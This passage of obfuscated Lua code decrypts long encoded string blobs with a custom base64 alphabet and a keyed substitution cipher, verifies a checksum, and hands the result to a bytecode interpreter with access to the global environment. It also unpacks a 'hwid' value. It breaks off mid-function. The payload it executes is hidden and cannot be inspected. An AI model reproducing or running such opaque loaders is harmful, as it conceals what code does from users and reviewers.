"JT4Bm5gE23sFwQ2na3-WX0dYj8rHM-9I94U-8kC18bIAKDpNnKtF0xPoOeTaB_bNwrOSGe4XDBfeEtQpTUh46P8Fi0QmsvFE_TPd04DxOJBdNyxb3asrO86jK3nD0T9JGXrcOcJI3vHXC3Y-GPL-mur-A8gDZNPx575TzofKnWGDMLIZy9M_72PKncAIHEvnI1gpXrahdXQ0F3eSZ-Ec1R-JddBqlItkS9mpf_jLnIsdHEs1hbDv4cSEGpe8DuMGfRwIeu-AO0ZE5yG4ldm2ibPoXS2qFwVYraWqFB_iXGKkUu6ovqXMxokz6BYnbTU50ehX3UEfYy2hKKHDDbHcEy7aaT3RGN9ddJreNT0Ofsxy8nZ8DUBWySEKBS7LqZG2YvlO70z8xwsb82kZRqlfAyiYAbe8mkBipOb6R4md-RIeQLsoUeuZ86W0JB6maoS9uJXNIqaNHVbRYBz16MNKlFdxy9WW77v0ScZ4MHbVasZH2r8k9wSfAP5v6buBR8O73DsQ4kYMLpyztpNGmqPD26Wvi6BspLKSQKRRgbtEZVK6m7TwnmkBQ0xHlIJ0p_susfpRUiyl4_32F9V12SRhmXVjlqeuECfgMSvJkASjSJTGbn9k4RMtKbi0oKVUf604lmGpkfYJxK7jnX2Yas8Lxz6ekUPH5ioOuyCycI0ho2CK7NXyEyT10lyr30xACPp9mGeK_Hq8gyUaF3SzWUQahXrYa3KT-XgZm6u77PXgxHppormMFzg4BOeuddcMdJNkbUeQaNVLoxEPLqsgfhkQW-QO773XqIqo0MvFTWrKwsTWL4I9K1ru7CodnoTGCluvwk7-HA47PFwBzZqs9DJrALHo0MVkAvUALu93CVKWqHaWrmo2X-zAV9ncjJuMk_6Ham8cIlh3TxF6EykvOHfQx7cM8hX8dKzkl2EzgcEl4nHt-W5qwYJ5NNQQ-fqhqRVqOVkGH33ACxQIHFOBa1tNM19Zxf-_qok88-PetvGMah7YYVbcd1FyeWlQRCkBTQMuA_tGxcv9IrDfU2F-NwJsEPEF45i28u0etcIEVZmcB56uu22IgB4AxTmGBgL5qz1ud-h_Oo8RdFMLMqBnLHk4DCQ4uoi755BheN0LUYzQa31kSYPRfq11AzYB08eGpUS0Zr9mfx2mrKWCuHgW5M-0fXDkHKH3_2I1hcj_e4SBksva1iu7s4wTiDXqSQhWl4b9IsR1eTz65J9HAHA4sRBryZ1XLWO4IHXxGRFU2eCLT6hmtNGmRLYtuDre72qdhHToyKv4sQbq5kodYlamqKrxrQ517yZ0Ni4Z3XWaEVYZrFGCVli-jwuKrlcq1QkY-77cLlRrmZWn6m4HWEtQhteXavHcaBme__QU_04ftou6b_z8bkhZOEoWHHFBrymNI3JdOFvZ6eirRdYgrBsiZdS9t6n2H1HKzgP8FMNuVkQhcHojieOqCJx2L7ceFv8hz5KECMQC3sYTpcFOQMqYD4JP5qbIDoU4Bvl2h-6QwMxCCx2Y58jk0B956MtZUXvfYyvEme0fopgi2LyZ7SHeF5VyNORlqQ3ctVZI8tT4oDUjHIuRqSI-sDSOJHrJyi15BFeXsSLvXra8OlBfbcyUQDdYb4JmHdC5-o5zVsvkfgKKuOcHJB376l0zbvxYALGwDBNlLjx5ej_MvsOdHMdhgZ28mLFvVJHdLMJRex8wGeAvIBddis7T-psde85nwNP4LEf8Pg1CMqQl0gq92TCQigrqaB5tpcirg6s5Fl5thPhJUvbXFp2jtie_ZEexgQSZoPzeLHWruxJWXYuhimJodvcvADXDiurWjZFWJELJaVRrJJmsXtUJNTzPHfeUqbde0YOKTjEBMx05v_t9qz8Ar7S3IzS5bE4BlSg8QxhRlQvexp5Iqd2TMs-3W5UVkD1_aDjREQsumCzcHFZlAeZD6jeP9QPyQWz2PapzUCLjvDC5aEqAIYXo-BmJtmVuE_bkeou5DOr-HROVW8A_ASaySi9vlSD2FRiCZCH4ylxN5qRFr48pj0kvn56A92i1AK88viNw8hXldRGOTafeLLCITVY-670Q-r_WjHF573Y2qfrhktr9DtixRFwuCC4_c1Zy5JJljTxW1sLHb1p2n3dJLP9DxxhdPKtwUjNmq2No7_n0Qn7swErDQsongLyJrJqcpuns2J1GZgrGevfODXFGB-kckBAYa-Jbzq3yL0cl9XGPbxdXysOf_oqIzLWyHr2VFe_3rifWr8aE9hA6gY-ftI4LeKbGXL_O82BubbKhOQ-v6h_4NaG4X_mmBxW8vuGgwhU0jaQDkCj1duEUapeFDuAtZIGa8Bu6R7_RUIvlQlPTvwafxwcRRQAxRSxUiq--6k3Iwo61vlt1ulMlvbOfLcJvjWCujuh_lVXvfR4Mta9lNHQWmH5kGr8-zpjYpD8eeumWDrGeKovlYQawebd7yZdNi0Uz8Z4pEC8mWDfE711YyftMuAV3NbLprSTUbnNYqV9zl56GXctYEoTkai9QrLCRjy2eXfXCd2NwClxnJqabm-FXrFQgq9Vx9s5jUtzChwaCn4jDiNdwUvkHT-kpGw6S_Mi-pPqjIs_htJVfa2QkcDMe7ActT4XbXoyffHKYMZK3DHv3BbZ3ka_4NCCI8nwakOlXF19SPLbs7LlI7on3ifkT67l-G0_W2jN0WvIeUflwAOmhi1xdVKuhtNoP2msnwXQclQWBOVsgZ2i-QXlCCY-TZJ0oZbUy9gpKrsFNV51xv2QIV18eBv4eeFAAELXOMYZMUhOvnZkUsNvPlFzfPGfAj3djW-VzhDyG373s5D1gWSQ_LsSVJ8rDReuiTG7_6cEsZNGz2tovNFDO0I3Ztbmy1lHELDiNJL_wCJVOmsjrbf-NHIAZ3p80T4eyEG-xQUGCDI3WIrf0ZZc-ctvJk7n1SqkwO2jR0T47eGb1X0CTvgQGqkjcYkslHVb7MecEDwm3_L8PuZnrCVFRzGhCNJiCtAeLUz4woLzMMcwUK5LA5S6Amu0kKN-pK-7clC1JbzEYm4KZif2ytYOXJLLiwFUOVeoZ9b1OJUufgffnahkBEEeLXZrhbpIXWYKuFM_uEfsVLQkKPQVErz5LR9fKAbWOQuwvf7HkvCE3Dz1uAT3tRzu_KjlpQSRlGPlPqnuSND0NoBQ6RXtWSbQD6m25UJFsjsQKCpHV6aIzOs7ZCXnp2BFCPvrkKFpFm1EUkZFrjh_RagCu3Ep3b6yiTu7roNmTqcVj6ItvKWZOPkFk7vJtqGVr7gv7RJkxcb33qQVFjMSgpGDKffPBmwTzIGMrWq-0qDtyXVkXz-NhFonQG3Zb2K_sm-1h9iUUMSZY6yvapkaRaIJqqIwAF6zek5ro_pQkDw8UAVfrxmpaW1ccNFXIWtxL_3R9bSgAgpyU9yjWrr30xZyjYmGKKF4SopT_2kLqEDxXisYdDsyzNsXAgPbhUSXW8qw44eamCmVGvFUT_M9TZPqvwU5KyjOknbYcIU7cF6ju3dP_gVeBJ4OKshFDXzcQxa5L1G3VaXS3RlmCCBs_MYly9xB7tVMdwcFbXCi5lHlkptP5tT616456-0sb908uABHP2ySEiaAZeBrq-HdNyW1sRyLdDl-G-S0lZXGmbbhYNHkcG6SioIq1oH4KiCa4s-w0qDDuhBJO_HxzDc4yhW2Bdwd5tNNJiHp1NBaPc8BocDZNhVLk6b0ZabEAo_6_lXCSkyEgrAKE-Xeo7G9dgFebl2lB6BdUvRLi26OibqrEs-QcmLD9Fpxnlpyduq7ldtePyjlhYmlNB0GtMHKB9saCVOHfYXAgys54zQHgGaOgd2tHbTxZauJ7Fat49ZQb4tPFHi-eDSNPTXc8soBAhxlaIo62p-OyJVsyT8z4fY5TycVt8RwBaUXca42tv5tHKpYFEuXZjSmwBkn69YTJUJQJqqpiVyjLVoU3nY7WZumVEGTip9h0P-iSKW6_pvS0Ii8LMJrbzrt7Do8esikGh8DsW8NYuRSGA9CbeSAw6z620XnlJYAnRKqPqt9eX4w9S2orlNNq4MkrhMZyfMYdO-WCs5xdxI8-6G3IfiAXO5iUSPyQ8mc2wUp-a_keFuBX8qiwBJkNKQW9unJjDayKHihwvDNg_yf65WOyRQvJwOfpeLicu5jwJfTgTP4EY7a_mn-MlSC_9SHf6hwnJuP7K4MR5SuddU8-OLDp22XfNiofbKJz074fXcfNsEC9cqLa-emKuP8CSzuJ2pTLWFkjwvDruTVQd9ns3tkCpIGxeTeBQfSieDFfL62_1LrdDvlB_Mg0U2rDdBA-65EtJfqtPTqqNwDewRly728iqFyJ8u70soTJlnwvRw5gaP55cCWH6WbWxTNAuqckgNblGkgB6Ga0-of3vCTjOICUathTsHrVcI-MQtPpEJFhaLty44HkyT7kGxhuS_B09ujD2k9tus-unPkfIvkIs9qEcgzfsDsi764IevFVFJIf462o8DMvnRvVmXIHhWnat_OFZ3bo4NdBcF_3MfhrVBdflO9OkMDazUudXTH0k3ur55SLk6tGx9vXGX7_FdB1girHX_7t3d2RkecBZdvcDLbK2cgb1RNE2grpeieKsZMZF47lPk-DseeoW0W7xhBgqtEav7Du13lgr796En29lmyu-i78U0s4XYWvtmZrcBBRr7IDh5VujAheupGZiJTaeWXiJFS2NibYw5JbMWfhm0Vsb2LnZIFocfng9jYU_q382Qsgx-dxwk2CaQlb4xCYODrylG6vBwTLvK_18UvTCvHoEd-pK8icWAYDo_NNNTlZy72iH4TtokbMa5V4c4CK_QqUw15BK9oAE24EsemHvm_ljMexw9W-fRuhuTgYCgSACbwlvaR5PkRIzlCvfpbKf0HN7j70aWj9LUUEDcfshoEg63QuFIAnFSYAyGgJw6Gx9IG84xn0axX3uC_4kZE4iVYDY8C3M2MIy6LUz4rbpl5XjlG4PJ3Xnv_LjVrxJPQfN7EROUo34usJw1BsJ7C4uecFfwBqbUMDaOja9pZ0dJI6Xd6qf2QX5dpW4S6G1fovu972EE6pe_h709RO37uw99jSblZsZBk86U06IuvaekkJfBXNzvNrgeYhm6hiV2QvHMVd3XFr4n0RsAkqzSER21p9idX17PbiFaKC_e9w6IWg6L2eT9zFmMcIaHpslXxmkOB6B5ClENGBviDi1KtG1bv-Zs48ySrJPLsycDsNmeDAKTM4hPoBsB8YUmhsrjZcSCRVa2krowEsD2odWrmPu-WHsDORlgLeOg1ed0YQCr8sy8i58DT7gqazkorY7_Kv_HV6LsnvO-MNCDwTiNDrLFgTRo2vlHKUU8GD-I18G23jDk1wIxtGTopHafC5FmtDs1Xr0b_-LR6eKov15RG_E4U2_USKWbHe_fK4GjI4beS-_yTl0pQqTmK1yfVQtjr1FJQCsK1WZfswP73PS6SCKWPcGoqLgP6xsvdcQ-D3boguWbVlWRFI10uePDmqJ7clyvi-hXOvMwYH1lpMcNfSD9sZgQjv6IeehcaAbpsfLxaRHUbginvFSrT_VKSOIe8OZ7qEv7Rpr_2QJUtfEbCAjMyeco-vq6fpWSv0B_nQ42wqwI6shmobs7EY3KJR9JqRz5aWXppu1zfTebkqGJY9nbKe4N1gT7PbmhIR4ZO1Qi0mttDn1InTEftsRZZ-q4WV-b8jis0uuheuf0ClCrHwuxX5S14SdHd7YZ5V7nTwFf74cjx8k1LGcQp50mKDQZO665wdgRjzd-En1JBa5cQf34k6VdPK65iGmfqk5lPUn15vb6j-f2bWvZiVvYhxqk2KGVLtRM-R8Wd7D1ZCpQyeAP2lXdQ9_Eq__fGSiPuvaVpP3qn5AA2c07bDKxJfwLUsfbed53WvpLbUi_wdBZ7hcAY1EbtNAG9OWxH6trtSPPddTxh6P6HPh8_GAJXeODO4t3qsp0IN-fC-326EUKXOj5oVnqDl1vLgHAF1OS9zsiDzHnz-XyO-S8AJdN0sOpF63SS29uIFBVATTEknmA0U0VIgqolM8aB3lLkUjHDRnt2UHmIjjSZYhVaHJ6BdaySHNkQQcoTI8Y3x42E6lVwry3o2JFilak5QLenE_YKa4yIaXPHGLuH96Ftdp7QsYDhm0NqJ-O8gp0bWOwPYWXYYtmxo9MFVwuNri2Jt_7-CuQ7fTpR392bh3D7jxciqRJoQW_e9nBoqVq2yXUXhCMSwu0qQXO0tTI2SSrMNK1uWVW_9cw_MLP8CZOJwdbmBrcYCYwoCdRGqELZ1dXcHt69xLbXxVPD5RQN33FlPDrGDq-rOLkkeLOW4ugwMflWyPimO31o-glXKJwI8irVKwqGUjZ-pL8Y6rFkDaFd-k35C5-LJosLwVjirafeDNYW_KaEwdhng314JHJYE73QhdNVIAb9z3WMR4D8H0BFgjCJtIKu6dEURGvXPrNccL780o4ObCvqoiDcy1Vhq-n3drLzkoKeTVeJhEv7CyUo14WQLD5domGp7GX12fELQBElyinXdXHAliF8I3Kx5-COg-hh-Y7KSR_SLSL3q6CI3QBc9fNh8hF0aSK0MUblYJuintSOwvL_maXwwTjwNEfN_fUPug0EKJYMpJW0Y3zXqyCuEQd1fI5rFLhdv49hLUk49uWJFzd8yX6sLH921L6wukjyha1UZ_YwpcUOo9OnlKIeMEl8TN3mDDZKWG8NCsJcifTCYJhUa4anFF4OsqjkrZeh1OSPdX7WnJmq4bKkhF27sbijvtcvwnF7Rpw77UilSEDCvK23P9oryvGhlnlWSNfBG8--ZdNF2i8b2k8ns8pP8jTjpV86QrF-xKaZzeyGTN4aRjPuQwLBVMe3R-dbv3rSHwbvxETf0NlWNZLYc7kbH84Gkkb86CyKjEHjsS4630CTGMnoYSG_-ia_dLPXtiIk6uztD1P_FnJex6pd18tfC7PbMeo0A0KyCyzO7oPiwqMwvcAkSYy5O1QPSWcCfi",
"b3FybAu0oXHGIPvuZombR2gXK4qcRiRW_eD1iDui3YAeJHLPMXm9FNPPVYfzTfuBgXSfTc44N3Nwyb77T_a-g7rYR4B5GCoOmjuFoNR8td0ftlrc01Iq0lUXITafjDYjVMX4drIQ02D9J32G9WLefLlk7nCczcEYGysfC-n6qErtD1WCnQniOToFXq3OKwhQL7-zei1HrBYjAECUXWZv_AvnEtDyNbaJo5YlPh1aGWxvwwsZV-t53nCCuJm9_5bPJOsbYamrcFRpqVl_L1kTOyTLBUqaLHQgqUHnh5JlD3_S_6C3IgpYcr-H43xyWzFn8Z7IpBAqBtGVgWXn2ibWGVXOj4u76lg_6M8aAd4VMsOExBAi32I5-zQcLT8fcLxU-boVkEgtWvqp22sJj0L7mquqTkr6WrsB7COkLAYte2l0adYUSdib7C40vYAU07ZubFad3lK8_CkogQf1LRRa-OYtysXikkmYaDky3UR6j_DiUrVv0UABoysdq_RNuirjwI8UPKeKBfBg-u_NYWTSmzXO3Iu72ZPf1IM4nr7_LIf6cP-WFEeJztco4JL8ZMqFsCPvtrPYNW0TWKN-DayBD7hXpMub-cNoz4Vaq2y3UrYpXjTlcs6V57FCZdNFUmir4WE-2RGhiB2_nbO0Bt8H_dGXwlWrN1gPSV0cwroYsAd-7ofUbHD5VtyyFlk99puG-gNpYt9dZY1LaHOSTWOWqt4pbFXq88YVp48c0W1nF2r8njXywJ_5ZrxCL59iWVPadbaPWjAKbt-_NW1Ypz4PCgWvfViKPkHOKBbK6sUE0fgVroInVHVeci75-tkyIKyWG6o-ctR1vrvCJ9XoJae6GBMDU6PDWkSymCeFEeMPbhnSCimGObq2wHZFViWARe5AnpiQa9G2VS6lFUvcEoiTRjjP7Rd5kQ736x7VZjnOobkUWL3OSYX-gxLDSAv9-29EXm2gibp9Sm0g8BbK91uD-KzlkxO3AEPBeiImQMeoR71WX9460n3JCwwnamqw-z4rsz4gw5F84DotpttTNQy0fJMIh8XQhek2Mhdla-ntQLSz1cru3WRVE_MtrEro67WQunpflhtFHTE-tRwoQwDNGWOKalXOSmJ-17a6dSMskNPSIxMjoO71FvZVBVMVEK8X94HBezIineVoNuhVsFuc9ATbwJEzLqb_e9wmqa2U0NC7kG-97GD1Rboe6DFzJDp2gzP8QE9bXbj6vTmDRv965FRlSUD9OrbU1JG-qvFWKzq9bLflhvNDIecG9JqXzCvtior4D0zONbpMToaGBrPqzgoDBL466UNdx6-hd3uAK0QA9iLqJ0R2MMEatxNckJouhvRa1tjKulp2MM3zCQiCP6Pg-1LlLlbm4wNt_M-1sPeBdMOU1cj9LZyd1RsPuZP9-IT4ZlB88mmUkBw5Ib_abLyCCdR-GLs9fKKqc5HdcIDSWcU6q9Oe_e0hlrlwcfsSBmd-t_dVXmy8S_Sr76QkkBAReBsRrhjds9asg2JFMub5N37I5qJw0hooCI7vf612Xbor2_qD0ugP4HSEgHPzyTJHGqjds17lXTV4Avmop2y2B-KgDWu1oSYkfaT01tPnPu55hf3PT6S9gzO_vUtvr_dIhNCQaDgFTHZszImzR1d02KwJXx6WxxQ4dJaO0r-VLQp9b4vIwuin2WGQpxXfVl6gRvxUSOMschbmdoBjZa9HebqY0Oi9dU440W53ERauS0TChA9VaFtWi6-3Nk-iD80Tk6r9HkSUIJgUyUjJYwOU-zq-VFTxHl6AFLthirTkdn4fIneSrAS4iY3R0flnrjdIWwKfFEDFm9BPh2j2hOEfRlrzcHgMZRhShxHBXyYyGWDhwRmF8rB9Pgcqu0mRjBayFvKm72cx6iD5z5dKaypsbF644grB23-hmO0RC6ck6q3cY93gbqev6gf55EKNIKIOtrZsNKfZh0HW11wGFE2mOlax-hQ5Zbz3EJZp96tpFE-BF_Z2Iou1F7gnuDjpF14xgzYxxLmcEaCrCqoPnXuQKmlnmFDyLK9g3hZfeav8MykkZp5_jxKxfixTawyyXDavmahwvsRdo9gyiN9GThGTqlOKh5526Wge6afMLNEYLpb4ultaY8xzBjlnIN2p26Guv4OmQQlUCiGm78K46OIqCULpJDqM1QX386fh2946Zbs1XXaT2ZN7gtDJSyAzE0CVw080cSD6aHWOAvmFn_YS8Il7iGwYc2xLgIJaTtW2QqRilUidVBcgv5n7KB_MAghzSVsF-jhSKucfsPKnl2hr8kygheorVW38r5iK_t7HtilWW7JoUHxw4OpwsA4XTBuJNNnVKfNnHLmYXlIc9i5tBEln8Np_AjJHgHH5MytGitOCYaAva0P8va-9LzdA_0zfvHMpRFnJkKHWQfJug5k9AjChnZbd35x5DrTcTn1Wkb1qquUMObfTlPU795ao_6GLpVE2DL7x60B03Tze4cuhPuwqDFqBzkabLq0H8BYB1TewZDs9i_ihOqupSt7yW2Jf1Cx5z-mqkSaahLTGnUppL2RHGVy1JVRJUxWGmcW6d_KGsI8HkTBXQ_6EyKqDdCBOttdWO3p_bePzX4GtwImZCqmMtgrfRCv1qz71PK69JkSv05j7hloV5pd_ijxMOF6GnQyPVSzBK0ddY5uO7Gn7x-cs0Ip8MrQp3HNrBg95KbMYBzAjFLyOxwx1X2LL9qbNoLjPzr78TtOJyc0f--Xb2F7x5mEFdgjU-F2nDKRBwyBWybP0mLBlEQxhPrHFhcGuEPmI7T0T8z1J-0uhg7RivVg5_c6chIOSYrFUfc5MBOgGuehAha0CPd_wMPdpT6d0EqmTg1p3fRVWl84t54CWOYoVE_Jkhnqjt3BF97ShnSF4GFZj_byX4LYLK2GyBuywKQNZ4Lw0J_tDaLXrepiwMppfkpiCI3lDIXaWfg0jbiXzW0GUlsnisX3TRPSRFewBbz5tyoiWLAE_dpueebe8WsotNo5EmSmLGx-Dwf2lifTyMaGsAA5U566fpEY-goMmfEke7wyogv92cRqcfkKTV2cNqaX6K6hYH2GHhU_Yv-wEQCPGLdfiWGR3M8x0v_WyKL2E3p0XDGmvlYM5P1kbqyphbyt5RNenVt4o98PN1c6Do0tQTUczPwsdF4CqnPBkEIwdx9B2YQTCSkSamDj7RPw7fgEfzAQC-9r0db4n4p9QoBJOMG5Efr2k2yMYaV-5l6xEEt7z1pE0g_RE8lBbmgP5JtoXMkl-OM0i6heJ5gythThuS4j9fISaZwh-AH82OgLYy2pjsV3dQo48dEBk3Ak5jV8kwl0HwVO2ouaSBWTRuxv0SFgAPuznJf4mPVAmuz5CLDboYCI8JFCIdc2IgLzy9kNQoQoeiTq1gA7jVj4xsU7TfS3qQZSE8wTOAgdpkZOVfquBjNCrIdUl9lUAhPTN5hkaasch0lQLSQe9Dny1-BZM4AwpHeVSsiTm7RDi1AwNwR5sI4l2SHIUq9PsaM3eceMgdaEZEHA3hyJ_0Ok-hb-qnU7E38qDG1IfK4yK-9WnZHm4j0DwAyjkIwKlbQuoYZhhGHwDNg5SjGZr21SCHAhzwTrX5KzRnpMWRm9wujjTntUKAuHLgMAYn-r4Qpb7hD-z7_r4YHpnZXa1x-cVl2g1kZghNUur9_GuGxld0zC2zlk-mBxCy2AF44vSFPpMG8OOoMpP1euehZEoBEVvtjG41fL7mfFWzqEvyoAfkJKKooLkpcAKMhpW6U6098bfzovvHzBkXgGDOthpzmAwrVt2cgBfeb9MRAqGz3OUOW435JK67HXqHVTGZEKnejJ0upF5L10UY8NlLVhQ0-CxAtj89gSryJqcuK946r-saTE6uLiseFVKZcfz2jHzVbPCZiVZLSP1l-0EXrpzOWk82o9MQC_EPlrJvGxuHbBK6XwdY3nC-23v2-dY444PDLF9w7PYOvWsSauQPqJlHOejp9OXoTEgxWwhQJSLBQzzcskeL8dCm6BGRsmsrifyrjgrb_xPhFSyZcdbRYTP_fsXC7VM_1sD9qA3No3hvRsktfB4SEQlFJ05cUdCkGdVkxGuHUziAON_vH-VUQI833es0sa2bZYE7E7TYD4-8LWgGuweJAtA9m7QABFsMbW4ncnm5mO-WYTemNYl1l_aFCJVhuylT1QIKTbpqjhimTZp_6PRsF_l7s1X91-30gE5Zz7dDvQ00cf7RVAC318BT5m3LIfxtdL1bS04EYEGOi0o4UZDY0dhPuVJbhrsf_vR6MRZTByo2SsRqqmBZ6IdLMu6xpB-CGqUpkAhh2H09Az8amhxI-h1Tt8aycQECSom5kjH4QnLYMpN8QA-kE3w2yj95MQznyoKJWvRFslUL7iqui59z07wDXHAA0YZiQ6Bs5S1Ks09tb_n-c5H1BtaqYhwJJTO6smhXoQ0jq6N6lR7FJkpz_A9SHBQPbzjMMUw6ffADKUu_qynetDjVI8xqfYgWKfz5R7f0rg1Yp4hn4FPtNkvE_WPS86Q3WY53xr0MT8GvPeeq8G-cG09Re84FPoGR3qNUt93RrGYD1ziGfXV4uo0K85gW-8H7ayzDsyvfJziWmEzloZocy3jxObeURXlxoqDUAkHraLM1pvZfFlMzvzhfo5Eeb2zy6sH4coRTgOsMXJfyaU23MB1ZXiVlYi6yxex79hPXw18i1LL3Syz2g8snRr-oMC5d4jHUYjXQ9NYp_mFI9rxmdhRg4gKcYu8oKxmNrDhvqnUEWREJ29gcikR8D4JfOLjJ7NbiaRo181LTvJrobgZySzbilNwtY1p7aqnuBR3upiss51WjCtl9fwfShOkdhAMjCuIBBH5smAvxmkOyXBBIHCl_KKZ7yceonct2O8H77AlfFzUSjU_iC61Du1Cv0AL5HpKn2rbFhHoC0Kpr_HabP0aTSxI0uMGp5zD5nUOUl7cnIyw-1MbjjDFcCRu1kLAa46bK5LunS7vLKGZLjwa12J5oFePbGxBj-Gbh80UwRgF-xoYqYhlEsbTOpj10LoJHmy9I0jCCNug1dOo6yFC_7qGyoW2IiR5vriUFWk0awWCyGBidjaBILNzNJYMTTp2C5Pyi8FJOVx2waL_9mZ3dv4wKRDfMrcOPHDb0QJT0UOQxTCS2z-pWaYQE7PNqrowl3r4EALmlXWGhydcAfun3u1ebIQdiNl-uO6bzSPGtctzIGVlSyrkkVKxrAwaIuq7qc1Q8QGzqeOa71rzRSfWimxDB9FAr1VYm7FXMBF2bIILn7OHCV23H7H4MfznM-XeblR40a4SYGEmOh90sjr6KqM6HM5Mucbha0xp4kQqCKKNLMr9atOOi5kVLTfw0khzC6I2Daz9agE6ZrDVxL7RAnNDfYwodWXzi9jek9RPEXNRVYEyt9OFzYTNQOF_tUbDapqCUlCqCb-SgubgvrZMBzqs2KwFK-4Os5Aw8C3_DEMUWLynZAUYK8qmzEyaFXWbrLD6tYjq1LQlFDTNs9v3NnIBqCKoG3nCED32b7fE_mQ8QY7FCn8_0pJcObd6a6zt5hpCtICpNdGJXiaAFepPzexPWkJmoYP3MglZONdkLE1TQXzBV3cLXmIB2xuojNzOXCJal-trrk8Kpz2fHvgsZoebmX7zWGGuJ5qjjHTOCh6pM5tOjY9iinD0CvxgdiMOX30ldRNs_OCc6PcBq_tUbLRBCalU1zzaTgITAUSpz_ECxsnZVZvmeExBorwLZtoPnZrQsf57Wz7Iii6UGTZvHeBe4m4I-aQHMt5b82mku5sltMb3DAycgBYb1f_EohCdi9yrFMg_8g_gYIcRoM8yv2-JgDLF734J4jeXv8Fdd-C42d_KRxUCenObn5Jp5k41zqdArjV6DxW3j-j9tY9UQ5UNqYWVXYfdh44j5_EnnxLjAmr-EznUjvfzEfl0F5eM1gx3ekkvID-8NKsOPChOXm5duPg63JdBAT4k0BkaqDE-k7hIcUxVTLXsOXr9JcLVY0BhmJP5Jf5ekZkj81F8egkC_ETmmOSiklnWxTp11xJITTmPq5feuVRYeikRJK9dCnYVvHqg81KyXaRK3b74i_I52R9qyOELkyKuMky8qSDLLLW3XTK7puqryOpcs9JW4rzysZ0VRJHo1mutDjRxmXCPkVTHOo4lSq89CYXf4QJPvvfJSkuX0F9luuy0Eiw2Rj-ZzOyc3VPlKEkIiQMmFX79CFov80_EfnDjDniGibvmE8bL5OxouydwnGBW-T_Hkar0jsC3IgOfoAPvAoCC_O_ISK87WYn2Vnb4TREg4CSg8fdXI2v84HAT0qvb0tt5_niKDkVflvbxqjh40F3zRXPHiiBIe-DqoYT-mXZtOiN81AvgR7Olm_Req999YXuO1jgODZIwfK267do4Fk45bxqw5Jg4U1CtMjoPM5i0vC21zaMYqSkaitfIZ7wh6eC-M9lhrwUnnnNv8wLwaOhmVFLhIMLru1G_Bvqp0C3mfYsZGDKNfk3iTTYpmWnDfDg1V8z8vir8Q6aq7m9nLc8qL3Kfo5hhs15u7EgK4ci87gR6RZI97UTnspdILEPdE8ZpjJWD7JMDYf5UHYYuAW-1NvzcIhFbkKcUTRT51TRg09tkEbWeUw5V1u2nvadgbNRgdY0FJgf-Hn5XeroKXBqPTsF_Kxi6V52ruuQQaTGQzqWea8JhcZgC9jhyZC2Tu0vT2N7Sa01cvz33GdjVTnmkCsTYZUjRsRzLg0AB5yhKHC7T8ReiWd-0pAuY12yDbEGized77Tno4vHain0l9984dT1z4H6AkPyBPnQqy68fjuFRQ9v4fmMcu1jiH09HzBVSRHC1gAjdo10E0al0xJsmAXkRnqHWphhHfYqXwJzdhy0tfIg_SHR-4uhXTv5ky3E-Dv12YqBTjogNhlCCR9nlMKiVpSgGsbMKjMNrlHakoQwD-7A_UbKvUXF46Su51Jk89v0exg6rolhtUYPSU0oThnT-rWgh4UcrDd2TQZd3T",
}
local _dc00={3,2,1}
local _b154={} for i=1,#_dc00 do _b154[i]=_a[_dc00[i]] end
local _2c6,_c925=_154(_4(table.concat(_b154)))
if _c925~=2002113637 then error(string.char(56,50,56,49),0) end
local _f6c
pcall(function() if type(getfenv)=="function" then _f6c=getfenv(1) end end)
if type(_f6c)~="table" then pcall(function() _f6c=_ENV end) end
if type(_f6c)~="table" then _f6c=_G end
local _5641,_d888,_99c8=_yw(_2c6)
local _94b=_nv(_5641,_f6c)
return _94b
end)()
end)()
if type(_84399f)~="table" then return end
local hwid,_0b7b82,_42bdec,_69f166,_162696,_6fc07b,_d517b5,nap =
  _84399f[1],_84399f[2],_84399f[3],_84399f[4],_84399f[5],_84399f[6],_84399f[7],_84399f[8]
_84399f=nil
_7aea30=(function()
return (function()
local _7={}
for _92g=0,255 do _7[_92g]=string.char(_92g) end
local _2e54={}
do
  local _jvc="20B3TPpuilsDA-OUrYZK1azRNIgcndw4GXkt5FjJmQv6_H9SqeLfMyWoE78bVhxC"
  for _92g=1,#_jvc do _2e54[string.byte(_jvc,_92g)]=_92g-1 end
end
local function _bc(s)
  local _e84,_q40,_t7x,_dlu={},0,0,0
  for _92g=1,#s do
    local _xz2=_2e54[string.byte(s,_92g)]
    if _xz2 then
      _t7x=_t7x*64+_xz2
      _dlu=_dlu+6
      if _dlu>=8 then
        _dlu=_dlu-8
        local _lx5=2^_dlu
        _q40=_q40+1
        _e84[_q40]=_7[math.floor(_t7x/_lx5)%256]
        _t7x=_t7x%_lx5
      end
    end
  end
  return table.concat(_e84)
end
local _82f1={}
do
  local _zog="\236\199-\219\\yNV\1718Z%u\137]cPiIfLl\210\142_W\028\230&zs\178\1327\189v\208\200+eY\196\026n\139\164\238\174\246\128h\175\194\241\002t\177\244\015\001\029\135\201\163\000\127\216\224\006\148A\239\169\150\161\207\226\154*6K\156\249\009}\245(\229\203r^\016a>/Xo\247\211\144\017\020\184\014\158E\143\204\021=\145\018{k,\190\176\031:\182\187'\152\188\248\251\232\"B\191\141Q\242\019d\027\220 \231Mp\253G?3S\205\004\213\136\131\228\159\134\140J\2174\2189\005D\18051x\179\186\025\233\149\237$T\147\202\167\030\nO\243\198\183\173\008m\165\185\195\1460<\168\215\181\170\162\129~U\240\250\166q\011\206j#\007F\235\157;\153\223b\160\252C)\234\214\254.\193\023\155!\225\221`\rg\222\022\151H\138\255\012\197\133\227\003\024@\130Rw\172[\212|2\209\192"
  for _92g=1,256 do _82f1[string.byte(_zog,_92g)]=_92g-1 end
end
local function _23a(S)
  local _sus,_4ho=2415049422,135
  local _e84,_q40,_fub={},0,0
  local P=368141 A=1500423465 L=10681662
  local K={4,44,104,211,158,115,62,85,206,124,158,187,67,199,186,178,46,217,205,56,4,232,188,247,95,239,214,122,27,19,44,179}
  for _92g=1,#S do
    _sus=(P*_sus+A)%4294967296
    local _8g0=string.byte(S,_92g)
    local _4kw=(_sus%256+K[((_92g-1)%32)+1]+((_92g*113+L)%256)+_4ho)%256
    _4ho=_8g0
    local _gql=(_82f1[_8g0]-_4kw)%256
    _fub=(_fub*33+_gql)%4294967296
    _q40=_q40+1
    _e84[_q40]=_7[_gql]
  end
  return table.concat(_e84),_fub
end
local function _at(_ua, _fc)
local _wv = table.unpack or unpack
local function _hx(...) return { n = select('#', ...), ... } end
local _sy
_sy = function(_cv, _nh, _ob)
local f1pucw, _aa, f53vxl = _cv.f1pucw, _cv.k, _cv.f53vxl
local _ke = {}
local _tk = _cv.f42qc6
for _rt = 1, _tk do _ke[_rt] = _nh[_rt] end
local _ka, _vb = {}, 0
if _cv.f97qzi then
